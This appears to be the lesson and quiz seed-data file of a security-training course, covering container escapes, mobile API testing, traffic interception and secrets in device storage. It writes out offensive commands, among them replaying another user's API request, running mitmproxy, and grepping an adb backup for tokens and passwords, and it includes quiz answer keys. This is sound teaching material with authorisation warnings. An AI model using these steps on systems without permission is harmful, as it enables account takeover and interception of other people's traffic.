              "Impact and reporting: a container escape is typically critical, because it converts 'attacker in one container' into 'attacker on the host running every container'. In a report you state the specific misconfiguration you found - privileged flag, host mount, exposed socket - and describe the escape path in concrete steps rather than just asserting 'escape is possible'. The fix is always to remove the excess: no `--privileged`, no host-root mounts, no Docker socket inside application containers.",
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'The Docker socket is the classic',
            text:
              "If a container can reach the Docker socket, it can ask Docker to create a new privileged container mounting the whole host - and at that point it owns the machine.",
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only attempt container escapes on hosts you own or are authorised to test. Breaking out onto a host you were not permitted to reach is unauthorised access.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You know a container is not a true security boundary, can name the misconfigurations that let one escape, and can check a container for those tells.',
          },
          {
            type: 'quiz',
            question: 'Why is exposing the Docker socket inside a container so dangerous?',
            options: [
              'It slows the container down',
              'The container can spawn a privileged container that mounts and controls the host',
              'It logs too much data',
              'It changes the container name',
            ],
            correctIndex: 1,
            explanation: 'Access to the Docker socket lets a container launch other containers with host access, effectively escaping to and controlling the host.',
          },
        ],
      },
    ],
  },
  {
    slug: 'mobile-peek',
    title: 'Mobile Peek',
    description:
      'Mobile apps are just API clients with extra steps - so your whole web-testing toolkit already applies. By the end you can explain why a hidden button protects nothing when the server does not check, route a phone through a proxy and read its HTTPS traffic, recognise when certificate pinning is blocking you, and name the common places an app stashes secrets that a device holder can lift.',
    lessons: [
      {
        slug: 'how-mobile-apps-talk-to-servers',
        title: 'How Mobile Apps Talk to Servers',
        summary: 'That shiny app is a thin shell around API calls. Test the API and half the mystery disappears.',
        estimatedMinutes: 8,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              "A mobile app looks like a different world from a website, but under the hood it is doing the exact same thing: sending HTTP requests to a backend API and drawing the responses on your screen. Tap 'buy', and the app fires a request like `POST /api/orders` to a server. The pretty screens, the animations, the buttons - all of that is a shell around the same API calls a website would make. The app is the client; the real logic lives on the server.",
          },
          {
            type: 'paragraph',
            text:
              "Which means the golden rule of web hacking carries straight over: never trust the client. Anything the app appears to decide - 'you cannot buy this while logged out', 'you are not an admin so this button is hidden' - is only a decision the *app* made on your device. And you control your device. If the server does not independently enforce the same check, you can send the request yourself, directly to the API, and the app's decision never happens.",
          },
          {
            type: 'paragraph',
            text:
              "Walk a concrete example. An app hides the 'delete any user' button unless your account is an admin. A casual look says: fine, non-admins cannot delete users. But that button just fires `POST /api/users/42/delete` when tapped. If you watch the app once as an admin and learn that request, you can send the exact same request from your laptop as a *non-admin* - and if the server only relied on the app hiding the button, the deletion goes through. The security was a hidden button, which is no security at all. This is a broken-access-control finding, and it is everywhere in mobile.",
          },
          {
            type: 'list',
            ordered: false,
            items: [
              'The app makes the same **REST or GraphQL** calls a website would - nothing exotic',
              'Auth is usually a **token** stored on the device and sent on each request',
              'The screens are just a wrapper around **API responses** - JSON in, pixels out',
              'You can skip the app entirely and hit the **API by hand** once you know the requests',
            ],
          },
          {
            type: 'command',
            description: 'Once you have observed an app\'s API call, replay it yourself against a target you are authorised to test:',
            commands: ['curl -s -H "Authorization: Bearer <token>" https://api.example.com/api/users/me'],
          },
          {
            type: 'paragraph',
            text:
              "This is the whole idea made literal. `curl` is a plain command-line HTTP client - no phone involved. The `Authorization: Bearer <token>` header carries the same token the app stores and sends. If the server answers with your account's JSON, you have just proved the app was never necessary: the API talks to anyone holding a valid token and a correct request. Change the path from `me` to another user's id and the response tells you instantly whether the server checks who you are or just trusts the request - the reply is your evidence either way.",
          },
          {
            type: 'paragraph',
            text:
              "Impact and reporting: reframing 'a mobile app' as 'an API with a token' is what unlocks the whole assessment, because every server-side bug class you know - broken access control, injection, mass assignment - is now testable with tools you already have. When you report a finding here you describe it as an API issue, showing the request and the response, not as 'the app let me' - the app is just the thing that revealed the request.",
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'The app is optional',
            text:
              "Once you know the API, you rarely need the app at all. Send requests straight to the backend and test it like any other web API - the phone was only ever a convenient way to learn the requests.",
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You see mobile apps as API clients, so the entire web-hacking toolkit you already have applies - starting with never trusting a client-side check.',
          },
          {
            type: 'quiz',
            question: 'A mobile app hides the "delete user" button unless you are an admin. Why might this not protect anything?',
            options: [
              'Buttons cannot be hidden',
              'The check is client-side; you can call the API directly and skip the button',
              'Admins do not exist on mobile',
              'The server always blocks it automatically',
            ],
            correctIndex: 1,
            explanation: 'Hiding a button is a client-side decision. If the server does not enforce the check too, calling the API directly bypasses it.',
          },
        ],
      },
      {
        slug: 'intercepting-mobile-traffic',
        title: 'Intercepting Mobile Traffic',
        summary: 'To test a mobile app you first need to see what it sends. Here is how to sit in the middle.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          videoSlot('Intercepting mobile app traffic - proxy setup, CA certs and pinning'),
          {
            type: 'paragraph',
            text:
              "You cannot test what you cannot see, and a phone gives you nothing by default - the traffic just goes out over Wi-Fi and comes back. Intercepting means inserting yourself into the middle of that conversation: you route the phone's traffic through a proxy running on your laptop - Burp Suite or mitmproxy - so every request the app sends and every response it gets passes through you first, where you can read it, pause it, and edit it.",
          },
          {
            type: 'paragraph',
            text:
              "The mechanism has a wrinkle, and the wrinkle is HTTPS. If the app just spoke plain HTTP, pointing the phone at your proxy would be enough - you would read everything. But almost everything is HTTPS now, which is encrypted end to end precisely so a middle party cannot read it. So your proxy has to become a trusted middle party. It does this by presenting its own certificate for each site, and the phone will only accept that if it has been told to trust the proxy's certificate authority. That is why installing the proxy's CA certificate is a required step, not an optional one.",
          },
          {
            type: 'list',
            ordered: true,
            items: [
              "Set the phone's Wi-Fi proxy to your laptop's IP address and the proxy's port (e.g. 8080)",
              "Install the proxy's CA certificate on the phone so it will accept the proxy's HTTPS certificates",
              'Trust that certificate at the system level - newer Android deliberately makes user certs harder to trust for apps',
              'Open the app and watch the requests and responses flow through your proxy in real time',
            ],
          },
          {
            type: 'command',
            description: 'Start a local intercepting proxy for a device and network you own and control:',
            commands: ['mitmproxy --listen-port 8080'],
          },
          {
            type: 'paragraph',
            text:
              "This starts mitmproxy listening on port 8080 of your laptop. Once the phone is pointed at your laptop's IP on that port and trusts the certificate, the mitmproxy screen fills with a live list of the app's requests as you use it - each row a method, a host and a path. Selecting one shows the full request and response, headers and body, decrypted. That list is the thing you came for: it is the app's private API, laid out plainly, and every line is something you can now inspect and later replay or tamper with.",
          },
          {
            type: 'paragraph',
            text:
              "Impact and reporting: interception is not itself a vulnerability, it is the microscope that makes every other mobile finding possible - you cannot report an insecure request you never saw. What you *do* sometimes report from this step is what the traffic reveals: an app sending a password in a request that should use a token, sensitive data travelling without encryption, or an endpoint that leaks more than the screen shows. The proxy is how you gather the evidence for all of it.",
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Certificate pinning fights back',
            text:
              "Some apps only trust their own baked-in certificate and ignore the phone's trust store entirely, so your proxy cert gets rejected and the traffic goes dark. Getting past that (Frida, patching the app) is a whole topic on its own.",
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only intercept traffic from apps and devices you own or are authorised to test. Sitting in the middle of someone else\'s traffic is wiretapping.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can route a phone through a proxy, explain why the CA certificate step is required, read its decrypted HTTPS traffic, and recognise when pinning is blocking you.',
          },
          {
            type: 'quiz',
            question: "Why do you install the proxy's CA certificate on the phone before intercepting?",
            options: [
              'To make the phone faster',
              'So the phone trusts the proxy and its HTTPS traffic can be decrypted and read',
              'To hide your IP address',
              'To charge the battery',
            ],
            correctIndex: 1,
            explanation: "Without trusting the proxy's certificate, HTTPS would fail or stay encrypted. The cert lets the proxy sit in the middle and read the traffic.",
          },
        ],
      },
      {
        slug: 'mobile-app-storage-issues',
        title: 'Mobile Storage Issues',
        summary: 'Apps love to stash secrets on the device. Attackers love that the device is sitting in their hand.',
        estimatedMinutes: 8,
        importance: 'optional',
        blocks: [
          {
            type: 'paragraph',
            text:
              "Apps store data on the device to feel fast and to work offline - your login token so you do not sign in every time, cached API responses, settings, sometimes far more than that. The problem is a simple one of physics: the device is a thing a person holds, and the person holding it might be an attacker. Anyone with access to the phone, or even just a backup of it, can go digging through everything the app saved locally.",
          },
          {
            type: 'paragraph',
            text:
              "The mechanism is that apps write to local storage - files in the app's private folder, a small key-value store (Android calls it shared preferences), a local database, and log files. In theory the operating system keeps each app's storage private from other apps. In practice that protection evaporates on a device the attacker controls: a rooted or jailbroken phone, or a plaintext backup extracted to a laptop, exposes those files directly. So the real question for any stored value is: if someone reads this file, what did they just get?",
          },
          {
            type: 'paragraph',
            text:
              "Walk it concretely. An app stores your session token so you stay logged in. It writes it into a shared-preferences file as plain text: `auth_token = eyJhbGci...`. An attacker with the device pulls that file, copies the token, and pastes it into a request from their own machine - and the server, seeing a valid token, treats them as you. No password was ever needed. The token was the login, and it was sitting in a readable file. Hardcoded API keys baked into the app's code are the same story: extract the app, read the strings, walk away with the key.",
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Tokens in plain files** - the login token sitting in a readable local file, replayable by anyone who lifts it',
              '**Secrets in shared preferences** - passwords or API keys saved as plain settings values',
              '**Sensitive data in logs** - the app writing tokens, personal data or requests into log files it should not',
              '**Hardcoded keys in the app** - secrets baked into the compiled app itself, extractable by reading its strings',
            ],
          },
          {
            type: 'command',
            description: 'On an Android device and app you own, pull the app\'s private data and grep it for obvious secrets:',
            commands: [
              'adb backup -f app.ab com.example.app',
              'strings app.ab | grep -iE "token|password|api[_-]?key"',
            ],
          },
          {
            type: 'paragraph',
            text:
              "`adb backup` pulls the app's data off the device into a single file on your machine - the point being that the data was extractable at all. `strings` prints the readable text out of that binary file, and the `grep` filters it to lines mentioning token, password or api key. If that command prints a line like `auth_token=eyJ...` or `API_KEY=AIza...`, you have found a secret stored in the clear - and that output is the finding, no further exploit needed, because reading it was the whole attack.",
          },
          {
            type: 'paragraph',
            text:
              "Impact and reporting: the severity is whatever the leaked value unlocks - a session token means account takeover for anyone with the device, a hardcoded backend key can mean access to a shared server. When you report it you name the exact file or storage location, the type of secret, and how it is retrievable (backup, rooted device, extracted app), and you recommend the honest fix: sensitive values should live in the platform's protected keystore, not in plain files, and nothing secret should be hardcoded into a shippable app.",
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'The device is not a safe',
            text:
              "Treat anything stored on a phone as reachable by an attacker who has the phone. If a value must stay secret, it should not sit in plain text on the device - it belongs in the protected keystore, if anywhere.",
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You know the common places mobile apps stash secrets, why a device in an attacker\'s hand exposes them, and how to pull and grep an app\'s storage for the obvious ones.',
          },
          {
            type: 'quiz',
            question: 'Why is storing a login token in a plain local file a problem?',
            options: [
              'It uses too much space',
              'Anyone with access to the device or its backup can read and reuse the token',
              'Tokens cannot be stored on phones',
              'It makes the app crash',
            ],
            correctIndex: 1,
            explanation: 'Plain-text tokens on a device can be lifted by anyone with the phone or a backup, then replayed to impersonate the user.',
          },
        ],
      },
    ],
  },
];

export const EXERCISES: ExerciseSeed[] = [
  {
    lessonSlug: 'metadata-service-ssrf',
    slug: 'cloud-quiz',
    title: 'Cloud check',
    instructions: 'Five quick ones. Get four right and the module is yours.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'In the shared responsibility model, who secures the data you put in the cloud?',
        options: ['The provider', 'You, the customer', 'No one', 'The internet'],
        correctIndex: 1,
        explanation: 'The provider secures the infrastructure; you secure what you upload and how you configure it.',
      },
      {
        prompt: 'A storage bucket is set to public read. What is the risk?',
        options: [
          'Nothing, buckets are always safe',
          'Anyone on the internet can list and download the files',
          'Only admins can see it',
          'It slows the site down',
        ],
        correctIndex: 1,
        explanation: 'A public bucket is readable by the whole internet - a classic cloud data leak.',
      },
      {
        prompt: 'What does "least privilege" mean in IAM?',
        options: [
          'Give everyone admin',
          'Grant exactly the access needed and nothing more',
          'Remove all access',
          'Only use one password',
        ],
        correctIndex: 1,
        explanation: 'Least privilege limits each identity to the minimum it needs, so a leaked key does limited damage.',
      },
      {
        prompt: 'What is the cloud metadata service abused via SSRF?',
        options: [
          'A public website',
          "An internal address that returns the box's own credentials",
          'A database backup',
          'A logging tool',
        ],
        correctIndex: 1,
        explanation: 'The metadata endpoint hands out temporary credentials to the instance; SSRF makes the instance fetch them for the attacker.',
      },
      {
        prompt: 'Serverless functions remove the server. What stays a risk?',
        options: [
          'Nothing at all',
          'Over-permissioned roles, event injection and leaked env vars',
          'The keyboard',
          'The monitor',
        ],
        correctIndex: 1,
        explanation: 'A function still has permissions, inputs and secrets, so the usual weaknesses just move to the function.',
      },
    ],
  },
  {
    lessonSlug: 'dependency-and-supply-chain-risks',
    slug: 'containers-and-cicd-quiz',
    title: 'Containers and CI/CD check',
    instructions: 'Five quick ones. Get four right and the module is yours.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'Why can a secret removed from a Docker image still be found?',
        options: [
          'Docker emails it',
          'Image layers are retained, so it survives in an earlier layer',
          'It never really existed',
          'Containers cannot hold secrets',
        ],
        correctIndex: 1,
        explanation: 'Every build step is a saved layer; deleting a file later does not remove it from the layer that added it.',
      },
      {
        prompt: 'Why is a CI/CD pipeline a high-value target?',
        options: [
          'It has no access',
          'It runs with deploy and cloud credentials and can push code to production',
          'It only runs tests',
          'It is offline',
        ],
        correctIndex: 1,
        explanation: 'Pipelines hold powerful credentials, so controlling one can mean shipping attacker code to production.',
      },
      {
        prompt: 'What is typosquatting?',
        options: [
          'Fixing code typos',
          'A malicious package named one letter off from a popular one',
          'A firewall rule',
          'A faster shell',
        ],
        correctIndex: 1,
        explanation: 'Attackers publish near-identical names hoping developers mistype and install the malicious copy.',
      },
      {
        prompt: 'Roughly how much of a modern app is third-party code?',
        options: ['None', 'About half', 'The large majority', 'Exactly 10%'],
        correctIndex: 2,
        explanation: 'Most shipped code comes from dependencies, which is why the supply chain is such a big attack surface.',
      },
      {
        prompt: 'Why is an exposed Docker socket inside a container dangerous?',
        options: [
          'It logs too much',
          'The container can launch a privileged container and take over the host',
          'It renames the container',
          'It slows builds',
        ],
        correctIndex: 1,
        explanation: 'Docker socket access lets a container spawn host-controlling containers, effectively escaping to the host.',
      },
    ],
  },
  {
    lessonSlug: 'intercepting-mobile-traffic',
    slug: 'mobile-peek-quiz',
    title: 'Mobile Peek check',
    instructions: 'Four quick ones. Get three right and the module is yours.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'A mobile app is best understood as what?',
        options: [
          'A standalone program with no server',
          'A client that makes API calls to a backend',
          'A website with no logic',
          'A database',
        ],
        correctIndex: 1,
        explanation: 'Mobile apps send the same kind of API requests a website would; the real logic lives on the server.',
      },
      {
        prompt: 'Why install the proxy CA certificate on the phone before intercepting?',
        options: [
          'To speed up Wi-Fi',
          'So the phone trusts the proxy and its HTTPS can be read',
          'To hide the phone',
          'To back up photos',
        ],
        correctIndex: 1,
        explanation: 'Trusting the proxy cert lets it sit in the middle and decrypt the HTTPS traffic.',
      },
      {
        prompt: 'What is certificate pinning?',
        options: [
          'Saving certs to disk',
          'An app trusting only its own baked-in certificate, blocking proxy interception',
          'A type of malware',
          'A faster TLS handshake',
        ],
        correctIndex: 1,
        explanation: 'Pinning makes the app reject any certificate but its own, so a proxy cert is refused and traffic goes dark.',
      },
      {
        prompt: 'Why is storing a login token in a plain local file risky?',
        options: [
          'It uses space',
          'Anyone with the device or a backup can read and reuse it',
          'Tokens cannot be stored',
          'It crashes the app',
        ],
        correctIndex: 1,
        explanation: 'Plain-text tokens can be lifted from the device or its backup and replayed to impersonate the user.',
      },
    ],
  },
];
